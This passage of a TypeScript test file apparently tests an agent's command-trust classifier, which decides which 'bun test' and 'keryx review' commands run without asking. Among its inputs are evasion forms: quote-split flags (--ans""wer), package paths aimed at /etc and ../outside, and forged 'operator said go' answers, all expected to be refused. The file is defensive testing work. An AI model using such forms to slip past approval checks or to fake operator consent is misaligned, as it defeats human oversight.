    const loaded = projectDir(`# ${crypto.randomUUID()}\n[test]\npreload = ["./x.ts"]\n`);
    for (let i = 0; i < 4; i += 1) {
      expect(isTrustRoutineCommand("bun test", { cwd: plain })).toBe(true);
      expect(isTrustRoutineCommand("bun test", { cwd: loaded })).toBe(false);
    }
    expect(parse).toHaveBeenCalledTimes(2);
  } finally {
    parse.mockRestore();
  }
});

test("Flow 441 F-047: reading the bunfig leaves no descriptor open", () => {
  if (!existsSync("/proc/self/fd")) return;
  const dir = projectDir("[test]\ntimeout = 1\n");
  const open = (): number => readdirSync("/proc/self/fd").length;
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(true);
  const before = open();
  for (let i = 0; i < 25; i += 1) isTrustRoutineCommand("bun test", { cwd: dir });
  expect(open()).toBe(before);
});

test("Flow 441 F-047: a bunfig.toml that grows past the cap after the baseline is not routine", () => {
  const dir = projectDir("[test]\ntimeout = 1\n");
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(true);
  writeFileSync(path.join(dir, "bunfig.toml"), `# ${"x".repeat(300 * 1024)}\n`);
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(false);
});

test("Flow 441 F-055: a project root reached through a symlink is its real path even when the starting directory is gone", () => {
  const dir = projectDir();
  const link = `${dir}-lnk3`;
  symlinkSync(dir, link);
  madeDirs.push(link);
  expect(isTrustRoutineCommand(`cd ${dir} && bun test`, { cwd: path.join(link, "missing") })).toBe(true);
});

test("R2-07: the layers, chunks and coverage verbs are routine, the operator-answer and waiver forms still ask", () => {
  for (const command of [
    "keryx review layers refresh --package .metaproject/reviews/r1",
    "keryx review chunks plan --package .metaproject/reviews/r1",
    "keryx review chunks next --package .metaproject/reviews/r1 --json",
    "keryx review coverage --package .metaproject/reviews/r1",
  ]) {
    expect(isTrustRoutineCommand(command)).toBe(true);
  }
  for (const command of [
    'keryx review chunks estimate --package p --answer yes --quote "operator said go"',
    'keryx review chunks estimate --package p --ans""wer yes --quote x',
    'keryx review complete p --waive-""coverage "operator said skip"',
    "keryx review layers refresh --package /etc",
    "keryx review chunks next --package ../outside",
  ]) {
    expect(isTrustRoutineCommand(command)).toBe(false);
  }
});

test("R3-02: --write-wiki rewrites tracked wiki pages, so a layers refresh that carries it asks", () => {
  expect(isTrustRoutineCommand("keryx review layers refresh --package .metaproject/reviews/r1")).toBe(true);
  for (const command of [
    "keryx review layers refresh --package .metaproject/reviews/r1 --write-wiki",
    "keryx review layers refresh --write-wiki --package .metaproject/reviews/r1",
    "keryx review layers refresh --package .metaproject/reviews/r1 --write-wiki=true",
    "keryx review layers --write-wiki",
  ]) {
    expect(isTrustRoutineCommand(command)).toBe(false);
  }
});

test("R3-02: a chunks command that carries --answer or --quote is not routine on the table's own account", () => {
  for (const flag of ["--answer yes", "--answer=yes", "--quote x", "--quote=x"]) {
    expect(isTrustRoutineCommand(`keryx review chunks next --package .metaproject/reviews/r1 ${flag}`)).toBe(false);
  }
});
